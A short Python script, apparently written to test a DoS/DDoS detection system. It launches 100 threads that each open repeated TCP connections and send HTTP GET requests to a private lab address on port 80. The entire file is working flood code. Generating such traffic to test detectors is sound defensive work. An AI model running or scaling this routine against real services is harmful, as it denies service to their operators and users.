# Test DoS/DDoS attack detection
import socket
import threading
import time
from datetime import datetime

def dos_attack(target_ip, port, packet_num):
    try:
        for i in range(10):  # Send 10 packets per thread
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
        print(f"Packet group {packet_num} sent")
    except:
        pass

print("=== DoS/DDoS ATTACK SIMULATION ===")
print(f"Target: 192.168.31.37:80 (HTTP)")
print(f"Start time: {datetime.now()}")
print()

target_ip = "192.168.31.37"
target_port = 80

print("Launching DoS attack (100 threads, 10 packets each = 1000 packets)...")
threads = []
for i in range(100):
    t = threading.Thread(target=dos_attack, args=(target_ip, target_port, i))
    t.start()
    threads.append(t)
    time.sleep(0.05)  # 50ms between thread launches

for t in threads:
    t.join()

print(f"\nAttack completed: 1000+ packets sent")
print("DoS/DDoS traffic generated - check detection system...")
